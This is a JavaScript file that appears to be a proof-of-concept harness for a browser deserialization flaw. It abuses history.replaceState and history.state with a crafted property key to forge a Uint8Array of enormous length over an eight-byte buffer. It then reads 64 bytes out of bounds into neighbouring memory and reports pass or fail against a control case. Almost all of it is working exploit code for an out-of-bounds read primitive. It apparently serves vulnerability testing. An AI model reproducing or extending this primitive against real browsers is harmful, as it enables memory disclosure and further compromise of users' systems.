// Read-only scan beyond the forged view's eight-byte backing buffer.
// The following cloned buffers contain distinct marker bytes; no OOB writes occur.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
function runCase(id, useBigInt) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(backing).fill(0x41);
    var neighborA = new ArrayBuffer(64);
    var neighborB = new ArrayBuffer(64);
    new Uint8Array(neighborA).fill(0x5a);
    new Uint8Array(neighborB).fill(0xc3);
    var filler = new Array(253);
    filler[0] = useBigInt ? BigInt(1) << BigInt(40) : 0;
    filler[1] = backing;
    filler[2] = neighborA;
    filler[3] = neighborB;
    for (var i = 4; i < filler.length; i++) filler[i] = {};
    var shared = { marker: 0x51515151 };
    var key = makeKey();
    var input = {};
    input.filler = filler;
    input.first = shared;
    input.second = shared;
    input[key] = 0;
    if (useBigInt) mark("neighbor_ready");
    phase = "store";
    history.replaceState(input, "");
    if (useBigInt) mark("neighbor_stored");
    phase = "load";
    var output = history.state;
    if (useBigInt) mark("neighbor_loaded");
    phase = "inspect";
    var target = output.filler[1];
    var synthetic = output["\u0000"];
    var isView = synthetic instanceof Uint8Array;
    var viewValid = isView && synthetic.buffer === target &&
      synthetic.byteOffset === 8 && synthetic.length > 1e12;
    var bytes = [];
    if (useBigInt && viewValid) {
      mark("neighbor_before_scan");
      phase = "scan";
      for (var n = 0; n < 64; n++) {
        bytes.push(synthetic[n]);
        if (n === 15) mark("neighbor_read_16");
        if (n === 31) mark("neighbor_read_32");
      }
      mark("neighbor_read_64");
      phase = "inspect";
    }
    var hex = "";
    var countA = 0;
    var countB = 0;
    for (var b = 0; b < bytes.length; b++) {
      var value = bytes[b];
      hex += (value < 16 ? "0" : "") + value.toString(16);
      if (value === 0x5a) countA++;
      if (value === 0xc3) countB++;
    }
    var tailPreserved = Object.prototype.hasOwnProperty.call(output, key) && output[key] === 0;
    var expected = useBigInt ? viewValid && bytes.length === 64 && !tailPreserved :
      output.first === output.second && tailPreserved && target.byteLength === 8;
    result = { id: id, status: expected ? "pass" : "fail", details: {
      view_valid: viewValid,
      backing_length: target.byteLength,
      normal_extra_undefined: new Uint8Array(target)[8] === undefined,
      neighbor_a_first: new Uint8Array(output.filler[2])[0],
      neighbor_b_first: new Uint8Array(output.filler[3])[0],
      scan_length: bytes.length,
      scan_hex: hex,
      marker_a_count: countA,
      marker_b_count: countB,
      first_canary: new Uint8Array(target)[0],
      last_canary: new Uint8Array(target)[7],
      tail_preserved: tailPreserved
    } };
  } catch (error) {
    result = { id: id, status: "error", details: {
      phase: phase, error: String(error).slice(0, 200)
    } };
  }
  try { history.replaceState(null, ""); }
  catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
  return result;
}
var control = runCase("neighbor_scan_no_bigint_control", false);
if (control.status !== "pass")
  return [control, { id: "neighbor_scan_bigint_case", status: "unsupported", details: { reason: "control_failed" } }];
return [control, runCase("neighbor_scan_bigint_case", true)];
